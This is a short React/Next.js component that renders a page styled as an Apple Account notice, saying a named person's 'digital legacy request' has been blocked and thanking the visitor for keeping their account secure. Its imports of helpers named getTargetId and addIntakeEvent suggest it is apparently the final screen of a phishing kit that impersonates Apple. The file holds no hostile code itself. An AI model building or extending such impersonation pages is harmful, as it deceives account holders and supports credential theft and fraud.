'use client';
import { BarLoader } from "react-spinners";
import "./Success.scss";
import { getTargetId } from "@/app/(tropic)/getTargetId";
import addIntakeEvent from "@/app/(tropic)/addIntakeEvent";
import { useEffect, useState } from "react";
import checkForExistingCheckpoint from "@/app/(tropic)/checkForExistingCheckpoint";
export default function Success() {
 
    return (
        <div className="Main Success">
            <div className="card">
                <img src="/apple-acc.svg" />
                <h1>Request blocked</h1>
                <p>
                    <strong>Angel Quinones</strong>'s digital legacy request has been blocked, and your ticket has been closed.&nbsp;<br className="mobileBreak"/>
                    If this was a mistake, ask your legacy contact to submit another request.
                </p>
                <p>
                    Thanks for helping us keep your Apple Account secure. You may now close this page.
                </p>
            </div>
        </div>
    )
}